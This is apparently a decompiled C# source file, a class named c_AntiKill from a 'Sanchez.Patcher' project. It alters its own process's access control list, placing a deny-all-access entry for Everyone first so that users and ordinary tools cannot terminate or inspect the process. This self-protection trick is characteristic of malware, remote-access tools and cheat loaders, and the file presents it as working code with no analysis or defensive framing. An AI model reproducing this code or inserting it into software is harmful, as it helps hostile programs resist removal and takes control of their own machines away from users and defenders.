using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace Sanchez.Patcher
{
	// Token: 0x02000007 RID: 7
	internal class c_AntiKill
	{
		// Token: 0x06000054 RID: 84
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

		// Token: 0x06000055 RID: 85
		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

		// Token: 0x06000056 RID: 86
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentProcess();

		// Token: 0x06000057 RID: 87 RVA: 0x00005450 File Offset: 0x00005450
		private RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
		{
			byte[] array = new byte[0];
			uint num;
			c_AntiKill.GetKernelObjectSecurity(processHandle, 4, array, 0u, out num);
			if ((ulong)num > 32767UL)
			{
				throw new Win32Exception();
			}
			if (!c_AntiKill.GetKernelObjectSecurity(processHandle, 4, array = new byte[num], num, out num))
			{
				throw new Win32Exception();
			}
			return new RawSecurityDescriptor(array, 0);
		}

		// Token: 0x06000058 RID: 88 RVA: 0x000054A4 File Offset: 0x000054A4
		private void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
		{
			byte[] array = new byte[dacl.BinaryLength];
			dacl.GetBinaryForm(array, 0);
			if (!c_AntiKill.SetKernelObjectSecurity(processHandle, 4, array))
			{
				throw new Win32Exception();
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000054D8 File Offset: 0x000054D8
		public void c_ImAntiKill()
		{
			IntPtr currentProcess = c_AntiKill.GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescriptor = this.GetProcessSecurityDescriptor(currentProcess);
			processSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
			this.SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
		}
	}
}
